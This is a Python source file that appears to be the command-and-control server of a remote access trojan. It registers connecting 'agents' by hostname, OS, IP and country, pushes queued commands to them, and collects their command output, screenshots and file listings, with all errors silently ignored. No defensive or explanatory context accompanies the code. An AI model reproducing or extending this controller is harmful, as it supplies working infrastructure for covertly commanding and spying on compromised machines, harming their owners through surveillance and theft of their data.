import asyncio
import json
from config import active_agents

async def handle_tcp_client(reader, writer):
    aid = str(id(writer))
    peer = writer.get_extra_info("peername")

    if peer and isinstance(peer, (list, tuple)):
        ip = str(peer[0])
    else:
        ip = "Bilinmiyor"

    try:
        line = await reader.readline()
        if not line:
            return

        m = json.loads(line.decode("utf-8").strip())

        q = asyncio.Queue()
        active_agents[aid] = {
            "queue": q,
            "hostname": m.get("hostname", "U"),
            "ip": ip,
            "os": m.get("os", "U"),
            "country": m.get("country", "US"),
            "current_path": "C:\\",
            "last_result": "",
            "screenshot": "",
            "files": [],
        }

        while True:
            cmd = await q.get()
            writer.write((cmd + "\n").encode("utf-8"))
            await writer.drain()

            buf = bytearray()
            while True:
                chunk = await reader.read(4096)
                if not chunk:
                    break
                buf.extend(chunk)
                if chunk.endswith(b"\n"):
                    break

            if not buf:
                break

            try:
                raw = buf.decode("utf-8", errors="ignore").strip()
                resp = json.loads(raw)
                rt = resp.get("type")
                rv = resp.get("value")

                if rt == "cmd":
                    active_agents[aid]["last_result"] = rv
                elif rt == "screenshot":
                    active_agents[aid]["screenshot"] = rv
                elif rt == "files":
                    try:
                        active_agents[aid]["files"] = json.loads(rv)
                    except:
                        active_agents[aid]["files"] = [rv]
            except:
                pass

            q.task_done()

    except:
        pass
    finally:
        if aid in active_agents:
            del active_agents[aid]
        writer.close()
